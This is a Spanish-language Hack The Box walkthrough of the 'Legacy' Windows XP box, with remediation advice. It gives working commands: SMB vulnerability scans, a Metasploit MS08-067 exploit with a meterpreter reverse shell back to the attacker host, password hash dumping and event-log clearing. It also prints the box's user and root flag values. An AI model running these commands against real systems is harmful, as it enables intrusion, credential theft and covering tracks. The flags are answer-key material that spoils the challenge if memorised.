# HTB — Legacy (Windows XP) 🟦
> **Box IP:** `10.129.227.181`  
> **Fecha:** 2025-09-14 08:47:47 -0300 (America/Argentina/Buenos_Aires)  
> **Objetivo:** Obtener `user.txt` y `root.txt` explotando **MS08-067** (alternativa: **MS17-010 psexec**).  
> ⚠️ Uso ético en laboratorio/HTB.

---

## 0) Estructura de trabajo
```bash
cd ~/Desktop/Maquinas/Legacy
mkdir -p scans loot
export TARGET=10.129.227.181
# (opcional) detectar tu LHOST de tun0
export LHOST=$(ip -br a show tun0 | awk '{print $3}' | cut -d/ -f1); echo $LHOST
```

## 1) Recon y confirmación de vulnerabilidades
```bash
# Puertos y servicios relevantes
nmap -p135,139,445 -sCV -Pn -n $TARGET -oN scans/targeted.txt

# Chequeo de MS08-067 y MS17-010
nmap --script smb-vuln-ms08-067,smb-vuln-ms17-010 -p445 -Pn -n "$TARGET" -oN scans/vuln.txt
batcat scans/vuln.txt
```
**Hallazgos:** `VULNERABLE` a **MS08-067** y **MS17-010** (SMBv1).

## 2) Explotación (ruta recomendada) — MS08-067
```bash
msfconsole -q -x "
use exploit/windows/smb/ms08_067_netapi;
set RHOSTS $TARGET;
set RPORT 445;
set LHOST $LHOST;
set PAYLOAD windows/meterpreter/reverse_tcp;
run;"
```
Notas:
- Si no entra a la primera: `show targets` y probar XP SP2/SP3 específico.
- Payload alternativo: `windows/meterpreter/reverse_http`.
- La opción `ExitOnSession` no aplica a este módulo (warning seguro de ignorar).

## 3) Sesión y estabilización
Salida clave:
```text
Server username: NT AUTHORITY\SYSTEM
OS: Windows XP SP3 x86 (LEGACY)
```
Recomendado (si es necesario):
```text
ps
migrate 1236      # spoolsv.exe (estable en XP)
getuid
```

## 4) Búsqueda y lectura de flags
Con Meterpreter:
```text
search -d "C:\\Documents and Settings" -f user.txt
search -d "C:\\Documents and Settings" -f root.txt

cat "C:\\Documents and Settings\\john\\Desktop\\user.txt"
cat "C:\\Documents and Settings\\Administrator\\Desktop\\root.txt"
```
Con `shell` (cmd):
```text
for /r "C:\\Documents and Settings" %f in (user.txt) do @type "%f"
type "C:\\Documents and Settings\\Administrator\\Desktop\\root.txt"
```

## 5) Evidencias y extracción
```bash
# En tu host (crear carpeta si no existe)
mkdir -p loot

# En meterpreter (descargar flags)
download "C:\\Documents and Settings\\john\\Desktop\\user.txt" loot/
download "C:\\Documents and Settings\\Administrator\\Desktop\\root.txt" loot/
```

## 6) (Opcional) Hashes y limpieza (solo lab/HTB)
```text
getsystem
hashdump
clearev
```

## 7) Remediación (para informe)
- **MS08-067**: aplicar parche **KB958644** (obsoleto para XP, pero clave históricamente).
- **MS17-010 (SMBv1)**: deshabilitar **SMBv1** y aplicar acumulativos 2017.
- Restringir 445 desde redes no confiables; segmentación; EDR/AV; hardening de servicios RPC/SMB.

## 8) Checklist
- [x] Recon puertos 135/139/445
- [x] Confirmar MS08-067 / MS17-010 → **VULNERABLE**
- [x] Explotar **MS08-067** (meterpreter)
- [x] Verificar privilegios (**NT AUTHORITY\SYSTEM**)
- [x] Leer `user.txt` (john) y `root.txt` (Administrator)
- [x] Descargar evidencias a `loot/`
- [x] (Opcional) hashdump / clearev
- [x] Redactar remediación

---

### Notas técnicas
- XP usa **`C:\\Documents and Settings`** (no `Users`).  
- `message_signing: disabled` en SMB facilita explotación (hallazgo típico en scans).  
- Si `reverse_tcp` no conecta, validar `LHOST` (tun0) o cambiar a `reverse_http`.


## 4b) Flags obtenidas (HTB Legacy)
- **user.txt (john):** `e69af0e4f443de7e36876fda4ec7644f`
- **root.txt (Administrator):** `993442d258b0e0ec917cae9e695d5713`
